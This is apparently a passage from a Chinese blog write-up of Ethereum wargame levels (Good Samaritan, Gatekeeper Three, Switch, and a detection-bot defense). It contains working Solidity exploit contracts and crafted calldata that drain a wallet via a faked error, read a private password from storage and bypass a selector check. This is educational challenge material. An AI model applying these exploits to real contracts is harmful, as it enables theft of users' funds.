+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address to, uint256 value) public override returns (bool) &#123;<br>    if (address(delegate) == address(0)) &#123;<br>        return super.transfer(to, value);<br>    &#125; else &#123;<br>        return delegate.delegateTransfer(to, value, msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后会执行<code>delegate.delegateTransfer(to, value, msg.sender)</code> 也即DET的<code>delegateTransfer</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function delegateTransfer(<br>    address to,<br>    uint256 value,<br>    address origSender<br>) public override onlyDelegateFrom fortaNotify returns (bool) &#123;<br>    _transfer(origSender, to, value);<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此时会把DET代币转到to地址，也即player的地址</p>
+<p>要防御此攻击，可以在delegateTransfer前检测origSender是不是CryptoVault的地址	</p>
+<p>我们可以设置bot</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier fortaNotify() &#123;<br>    address detectionBot = address(forta.usersDetectionBots(player));<br>    uint256 previousValue = forta.botRaisedAlerts(detectionBot);<br>    forta.notify(player, msg.data);<br>    _;<br>    if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但这里bot接受的是msg.data，msg.data包含函数选择器(4 bytes)以及参数</p>
+<p>可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address))；<br></code></pre></td></tr></table></figure>
+
+<p>进行解码得到参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract MyBot is IDetectionBot&#123;<br>    function handleTransaction(address user, bytes calldata msgData) external override &#123;<br>        (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));<br>        if(origSender == 0x94DBE106c6eB8ec2f064784B8A300f5eaAB1afF9)&#123;<br>            IForta(msg.sender).raiseAlert(user);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Good-Samaritan"><a href="#Good-Samaritan" class="headerlink" title="Good Samaritan"></a>Good Samaritan</h2><blockquote>
+<p>This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.</p>
+<p>Would you be able to drain all the balance from his Wallet?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity &gt;=0.8.0 &lt;0.9.0;<br><br>import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;<br><br>contract GoodSamaritan &#123;<br>    Wallet public wallet;<br>    Coin public coin;<br><br>    constructor() &#123;<br>        wallet = new Wallet();<br>        coin = new Coin(address(wallet));<br><br>        wallet.setCoin(coin);<br>    &#125;<br><br>    function requestDonation() external returns(bool enoughBalance)&#123;<br>        // donate 10 coins to requester<br>        try wallet.donate10(msg.sender) &#123;<br>            return true;<br>        &#125; catch (bytes memory err) &#123;<br>            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;<br>                // send the coins left<br>                wallet.transferRemainder(msg.sender);<br>                return false;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Coin &#123;<br>    using Address for address;<br><br>    mapping(address =&gt; uint256) public balances;<br><br>    error InsufficientBalance(uint256 current, uint256 required);<br><br>    constructor(address wallet_) &#123;<br>        // one million coins for Good Samaritan initially<br>        balances[wallet_] = 10**6;<br>    &#125;<br><br>    function transfer(address dest_, uint256 amount_) external &#123;<br>        uint256 currentBalance = balances[msg.sender];<br><br>        // transfer only occurs if balance is enough<br>        if(amount_ &lt;= currentBalance) &#123;<br>            balances[msg.sender] -= amount_;<br>            balances[dest_] += amount_;<br><br>            if(dest_.isContract()) &#123;<br>                // notify contract <br>                INotifyable(dest_).notify(amount_);<br>            &#125;<br>        &#125; else &#123;<br>            revert InsufficientBalance(currentBalance, amount_);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Wallet &#123;<br>    // The owner of the wallet instance<br>    address public owner;<br><br>    Coin public coin;<br><br>    error OnlyOwner();<br>    error NotEnoughBalance();<br><br>    modifier onlyOwner() &#123;<br>        if(msg.sender != owner) &#123;<br>            revert OnlyOwner();<br>        &#125;<br>        _;<br>    &#125;<br><br>    constructor() &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function donate10(address dest_) external onlyOwner &#123;<br>        // check balance left<br>        if (coin.balances(address(this)) &lt; 10) &#123;<br>            revert NotEnoughBalance();<br>        &#125; else &#123;<br>            // donate 10 coins<br>            coin.transfer(dest_, 10);<br>        &#125;<br>    &#125;<br><br>    function transferRemainder(address dest_) external onlyOwner &#123;<br>        // transfer balance left<br>        coin.transfer(dest_, coin.balances(address(this)));<br>    &#125;<br><br>    function setCoin(Coin coin_) external onlyOwner &#123;<br>        coin = coin_;<br>    &#125;<br>&#125;<br><br>interface INotifyable &#123;<br>    function notify(uint256 amount) external;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一次可以转走10枚coin，一共有1000000枚</p>
+<p>但是只要触发<code>NotEnoughBalance</code>异常就可以把coin全部转走</p>
+<p>如果目标是合约账户在transfer的时候会调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">INotifyable(dest_).notify(amount_);<br></code></pre></td></tr></table></figure>
+
+<p>我们可以在此处抛出异常，从而转走所有coin</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    error NotEnoughBalance();<br>    GoodSamaritan public goodSamaritan = GoodSamaritan(0xd7A9c9Ab9bAA0c5FDafC211bb2935c94B91A3368);<br>    function exploit() public &#123;<br>        goodSamaritan.requestDonation();<br>    &#125;<br>    function notify(uint256 amount) external pure&#123;<br>        if(amount == 10)&#123;<br>            revert NotEnoughBalance();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里在notify判断amount是否等于10，是因为要在最后一次转走全部coin的时候不revert交易</p>
+<h2 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h2><blockquote>
+<p>Cope with gates and become an entrant.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract SimpleTrick &#123;<br>  GatekeeperThree public target;<br>  address public trick;<br>  uint private password = block.timestamp;<br><br>  constructor (address payable _target) &#123;<br>    target = GatekeeperThree(_target);<br>  &#125;<br>    <br>  function checkPassword(uint _password) public returns (bool) &#123;<br>    if (_password == password) &#123;<br>      return true;<br>    &#125;<br>    password = block.timestamp;<br>    return false;<br>  &#125;<br>    <br>  function trickInit() public &#123;<br>    trick = address(this);<br>  &#125;<br>    <br>  function trickyTrick() public &#123;<br>    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;<br>      target.getAllowance(password);<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract GatekeeperThree &#123;<br>  address public owner;<br>  address public entrant;<br>  bool public allowEntrance;<br><br>  SimpleTrick public trick;<br><br>  function construct0r() public &#123;<br>      owner = msg.sender;<br>  &#125;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender == owner);<br>    require(tx.origin != owner);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(allowEntrance == true);<br>    _;<br>  &#125;<br><br>  modifier gateThree() &#123;<br>    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;<br>      _;<br>    &#125;<br>  &#125;<br><br>  function getAllowance(uint _password) public &#123;<br>    if (trick.checkPassword(_password)) &#123;<br>        allowEntrance = true;<br>    &#125;<br>  &#125;<br><br>  function createTrick() public &#123;<br>    trick = new SimpleTrick(payable(address(this)));<br>    trick.trickInit();<br>  &#125;<br><br>  function enter() public gateOne gateTwo gateThree &#123;<br>    entrant = tx.origin;<br>  &#125;<br><br>  receive () external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>想要修改entrant，需要通过gateOne、gateTwo和gateThree</p>
+<p>对于gateOne</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateOne() &#123;<br>  require(msg.sender == owner);<br>  require(tx.origin != owner);<br>  _;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用<code>construct0r</code> 方法即可将owner修改为msg.sender</p>
+<p>通过部署一个攻击合约调GatekeeperThree的方法即可让<code>tx.origin != owner</code>，此时ms g.sender为攻击合约的地址，tx.origin为调用者</p>
+<p>对于gateTwo，需要调用<code>getAllowance</code>，前提是要知道password</p>
+<p>先调用一次<code>createTrick</code>，创建一个SimpleTrick合约，地址为0x79a11Bb3a62fD8a12ae6A4F2FB8f2b069323a436</p>
+<p>在SimpleTrick合约中，password是存在slot2中的</p>
+<p>通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">await web3.eth.getStorageAt(&quot;0x79a11Bb3a62fD8a12ae6A4F2FB8f2b069323a436&quot;,2)<br></code></pre></td></tr></table></figure>
+
+<p>获得password为0x658be220</p>
+<p>对于gateThee，先给他转账0.001 ether，在修改自己的receive函数，在接受转账的时候revert即可</p>
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>  GatekeeperThree public gate = GatekeeperThree(payable(0x46a56920AD51311e33D17d3F7aB8Da27639F01c0));<br>  function exploit() public payable &#123;<br>    gate.construct0r();<br>    gate.getAllowance(uint(0x658be220));<br>    payable(address(gate)).transfer(msg.value);<br>    gate.enter();<br>  &#125;<br>  function receive() external payable &#123;<br>    revert();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h2><blockquote>
+<p>Just have to flip the switch. Can’t be that hard, right?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/ SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Switch &#123;<br>    bool public switchOn; // switch is off<br>    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));<br><br>     modifier onlyThis() &#123;<br>        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);<br>        _;<br>    &#125;<br><br>    modifier onlyOff() &#123;<br>        // we use a complex data type to put in memory<br>        bytes32[1] memory selector;<br>        // check that the calldata at position 68 (location of _data)<br>        assembly &#123;<br>            calldatacopy(selector, 68, 4) // grab function selector from calldata<br>        &#125;<br>        require(<br>            selector[0] == offSelector,<br>            &quot;Can only call the turnOffSwitch function&quot;<br>        );<br>        _;<br>    &#125;<br><br>    function flipSwitch(bytes memory _data) public onlyOff &#123;<br>        (bool success, ) = address(this).call(_data);<br>        require(success, &quot;call failed :(&quot;);<br>    &#125;<br><br>    function turnSwitchOn() public onlyThis &#123;<br>        switchOn = true;<br>    &#125;<br><br>    function turnSwitchOff() public onlyThis &#123;<br>        switchOn = false;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>calldata的前32bytes是偏移量，在偏移量处的32bytes是参数长度，再接着是参数值</p>
+<p>这里使用<code>calldatacopy(selector, 68, 4)</code>，因为函数选择器占4 bytes，在默认情况下(offset为0x20)，这个取的是参数的值，即flipSwith的_data，限制了他只能是<code>turnSwitchOff</code></p>
+<p>那么我们只要修改offset就行了</p>
+<figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs glsl"><span class="hljs-number">0</span>x<br><span class="hljs-number">30</span>c13ade   <span class="hljs-comment">// flipSwitch的函数选择器</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000060</span> <span class="hljs-comment">// 偏移96bytes</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000004</span> <span class="hljs-comment">// 虚假的数据长度</span><br><span class="hljs-number">20606e1500000000000000000000000000000000000000000000000000000000</span> <span class="hljs-comment">// turnSwitchOff的函数选择器</span><br>-- <span class="hljs-keyword">offset</span>设置了实际从这里开始 --<br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000004</span> <span class="hljs-comment">// 数据长度</span><br><span class="hljs-number">76227e1200000000000000000000000000000000000000000000000000000000</span> <span class="hljs-comment">// turnSwitchOn的函数选择器</span><br></code></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    function exploit() public&#123;       address(0x0B1720bF25d6610195A084217E3Bd4C6F3ccAA24).call(hex&quot;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Etherenum/" class="print-no-link">#Etherenum</a>
+      
+        <a href="/tags/BlockChain-Security/" class="print-no-link">#BlockChain Security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Etherenum-WriteUp</div>
+      <div>http://example.com/2024/01/31/Etherenum-WriteUp/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"chbeNMVzNkGT8To7z3Vxgjyt-gzGzoHsz","appKey":"UzAM1Q24O06mdp7Cc31o9RHm","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
